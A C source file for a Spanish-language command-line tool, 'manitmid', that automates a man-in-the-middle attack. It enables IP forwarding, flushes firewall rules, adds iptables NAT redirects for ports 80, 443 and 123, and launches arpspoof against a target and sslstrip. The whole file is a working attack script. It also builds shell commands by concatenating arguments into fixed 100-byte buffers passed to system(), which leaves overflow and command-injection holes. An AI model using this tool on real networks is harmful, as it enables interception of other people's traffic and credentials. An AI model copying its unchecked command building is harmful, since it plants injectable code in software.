#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void main(int argc, char *argv[]){
	if(argc==1){
		printf("Necesitas ingresar argumentos.\nPrueba [ manitmid --help ]");
	}else if(argc==2){
		if(strcmp(argv[1],"--help")==0){
			printf("igual");
		}else if(strcmp(argv[1],"--flow")==0||strcmp(argv[1],"-f")==0){
			system("echo 1 > /proc/sys/net/ipv4/ip_forward");
			system("cat /proc/sys/net/ipv4/ip_forward");
		}else{
			printf("No se reconoce argumento.\nPrueba [ manitmid --help ]");
		}
	}else if(argc==3){
		if(strcmp(argv[1],"--iptables")==0||strcmp(argv[1],"-i")==0){
			if(strcmp(argv[2],"clean")==0||strcmp(argv[2],"c")==0){
				system("iptables -F");
				system("iptables -t nat -F");
			}else if(strcmp(argv[2],"show")==0||strcmp(argv[2],"s")==0){
				system("iptables -L");
			}else if(strcmp(argv[2],"showAll")==0||strcmp(argv[2],"sA")==0){
				system("iptables -t nat -L");
			}
		}else if(strcmp(argv[1],"--sslstrip")==0||strcmp(argv[1],"-s")==0){
			system("cd /usr/share/sslstrip/");
			system("pwd");
			char tmp[100];
			strcpy(tmp,"./sslstrip.py -k -l ");
			strcat(tmp,argv[2]);
			system(tmp);
		}
	}else if(argc==4){
		if(strcmp(argv[1],"--iptables")==0||strcmp(argv[1],"-i")==0){
			if(strcmp(argv[2],"prerouting")==0||strcmp(argv[2],"p")==0){
				if(strcmp(argv[3],"hsn")==0){
					system("./manitmid -i p tcp 80 8080");
					system("./manitmid -i p tcp 443 8080");
					system("./manitmid -i p udp 123 123");
				}
			}
		}
	}else if(argc==5){
		if(strcmp(argv[1],"--arpspoof")==0||strcmp(argv[1],"-a")==0){
			char tmp[100];
                        strcpy(tmp,"arpspoof -i ");
                        strcat(tmp,argv[2]);
			strcat(tmp," -t ");
                        strcat(tmp,argv[3]);
			strcat(tmp," ");
			strcat(tmp,argv[4]);
                        system(tmp);
		}
	}else if(argc==6){
		if(strcmp(argv[1],"--iptables")==0||strcmp(argv[1],"-i")==0){
                        if(strcmp(argv[2],"prerouting")==0||strcmp(argv[2],"p")==0){ 
                                char tmp[100];
                                strcpy(tmp,"iptables -t nat -A PREROUTING -p ");
                                strcat(tmp,argv[3]);
                                strcat(tmp," --destination-port ");
                                strcat(tmp,argv[4]);
                                strcat(tmp," -j REDIRECT --to-port ");
                                strcat(tmp,argv[5]);
				system(tmp);
                        }
                }

	}
}
